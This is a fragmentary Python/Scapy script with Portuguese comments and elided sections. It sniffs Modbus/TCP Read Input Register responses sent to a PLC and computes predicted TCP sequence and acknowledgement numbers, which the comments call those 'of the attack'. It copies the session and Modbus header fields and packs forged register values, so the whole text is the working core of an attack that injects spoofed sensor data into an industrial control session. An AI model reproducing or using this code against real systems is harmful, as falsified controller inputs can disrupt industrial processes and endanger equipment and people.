...
while flag: 
    ...
    PACOTES_INTERCEPTADOS = sniff(iface=iface_, 
        count= 2 ,
        lfilter= lambda x: x.haslayer(Raw) and x.haslayer(IP) and x[IP].dst == ip_CLP and x[Raw].load[7]==4)
    
    RESPONSE_RIR_LOOP_1 = PACOTES_INTERCEPTADOS[0] #RESPONSE Read Input Register loop 1
    RESPONSE_RIR_LOOP_2 = PACOTES_INTERCEPTADOS[1] #RESPONSE Read Input Register loop 2
    contador += 1
        
    try:
        # Verifica se os pacotes capturados são do tipo Read Input Registers
        if b'\x01\x04\x06' in RESPONSE_RIR_LOOP_1[Raw].load and b'\x01\x04\x06' in RESPONSE_RIR_LOOP_2[Raw].load:
...
#Cálculo do seq e ack do ataque (RESPONSE READ INPUT REGISTERS)


TAMANHO_SEQ = RESPONSE_RIR_LOOP_2.seq - RESPONSE_RIR_LOOP_1.seq
TAMANHO_ACK = RESPONSE_RIR_LOOP_2.ack - RESPONSE_RIR_LOOP_1.ack

SEQ_ATAQUE = (RESPONSE_RIR_LOOP_2.seq + TAMANHO_SEQ)
ACK_ATAQUE = (RESPONSE_RIR_LOOP_2.ack + TAMANHO_ACK)

#Vetor com valores sniffados do último response
DADOS_LAYER_TPC = {
     'src': RESPONSE_RIR_LOOP_2[IP].src,
     'dst': RESPONSE_RIR_LOOP_2[IP].dst,
     'sport': RESPONSE_RIR_LOOP_2[TCP].sport,
     'dport': RESPONSE_RIR_LOOP_2[TCP].dport,
     'wnd': RESPONSE_RIR_LOOP_2[TCP].window,
}
...
Trans_ID = ((RESPONSE_RIR_LOOP_2[Raw].load[0] << 8) + RESPONSE_RIR_LOOP_2[Raw].load[1]) + tamanho_do_loop
Protocol_Identifier = (RESPONSE_RIR_LOOP_2[Raw].load[2] << 8) + RESPONSE_RIR_LOOP_2[Raw].load[3]
Length = (RESPONSE_RIR_LOOP_2[Raw].load[4] << 8) + RESPONSE_RIR_LOOP_2[Raw].load[5]
Unit_ID = RESPONSE_RIR_LOOP_2[Raw].load[6]
WMC_FUNCTION = RESPONSE_RIR_LOOP_2[Raw].load[7]
Byte_Count = RESPONSE_RIR_LOOP_2[Raw].load[8]

Data_Bytes = struct.pack(">3H", 1000, 1000, 0)
print(Data_Bytes)
